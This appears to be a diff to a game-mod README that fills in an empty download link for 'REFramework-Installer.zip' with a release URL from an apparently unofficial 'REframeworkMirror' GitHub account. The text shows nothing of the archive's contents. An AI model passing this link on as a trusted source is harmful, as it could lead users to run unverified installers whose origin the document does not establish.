@@ -7,7 +7,7 @@
 
 
 ## Install
-[Download `REFramework-Installer.zip`]()
+[Download `REFramework-Installer.zip`](https://github.com/REframeworkMirror/REframework-MH-Wilds-RE9/releases/download/v1.95.0/REFramework-Installer.zip)
 ---
 
 <img width="385" height="190" alt="images3" src="https://github.com/user-attachments/assets/18ad44f6-b578-4378-bbe0-7e5c9b03f33d" />
